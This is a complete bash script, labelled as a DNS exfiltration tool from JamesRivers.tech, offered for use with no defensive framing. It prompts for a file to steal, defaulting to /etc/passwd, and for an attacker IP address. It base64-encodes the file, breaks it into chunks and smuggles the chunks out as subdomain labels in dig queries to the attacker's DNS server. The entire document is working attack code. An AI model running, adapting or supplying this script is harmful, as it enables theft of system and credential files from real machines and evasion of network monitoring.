#!/bin/bash
# DNS Exfiltration Script - JamesRivers.tech
# Usage: ./exfiltrate.sh

echo "===================================="
echo "    DNS Exfiltration Tool"
echo "===================================="
echo ""

# Ask for file
read -p "File to exfiltrate [/etc/passwd]: " FILE
FILE="${FILE:-/etc/passwd}"

# Ask for attacker IP
read -p "Attacker IP address: " DNS_SERVER

# Check inputs
if [ -z "$DNS_SERVER" ]; then
    echo "Error: IP address required"
    exit 1
fi

if [ ! -f "$FILE" ]; then
    echo "Error: File not found"
    exit 1
fi

# Configuration
DOMAIN="yourdomain.com"
CHUNK_SIZE=40

echo ""
echo "Target: $FILE"
echo "Server: $DNS_SERVER"
echo "===================================="
echo ""

# Encode and chunk
echo "[*] Encoding file..."
BASE64_DATA=$(base64 -w 0 "$FILE" 2>/dev/null || base64 "$FILE" | tr -d '\n')
DATA_LENGTH=${#BASE64_DATA}
NUM_CHUNKS=$(( (DATA_LENGTH + CHUNK_SIZE - 1) / CHUNK_SIZE ))

echo "[*] Sending $NUM_CHUNKS chunks..."
echo ""

# Send chunks
CHUNK_NUM=0
for ((i=0; i<DATA_LENGTH; i+=CHUNK_SIZE)); do
    CHUNK="${BASE64_DATA:$i:$CHUNK_SIZE}"
    CHUNK_NUM=$((CHUNK_NUM + 1))
    QUERY="${CHUNK_NUM}.${CHUNK}.${DOMAIN}"
    
    # Send DNS query
    dig "$QUERY" @"$DNS_SERVER" +short +time=1 +tries=1 >/dev/null 2>&1
    
    echo -ne "\r[+] Progress: $CHUNK_NUM/$NUM_CHUNKS"
    sleep 0.05
done

echo ""
echo ""
echo "===================================="
echo "[+] Exfiltration complete!"
echo "===================================="
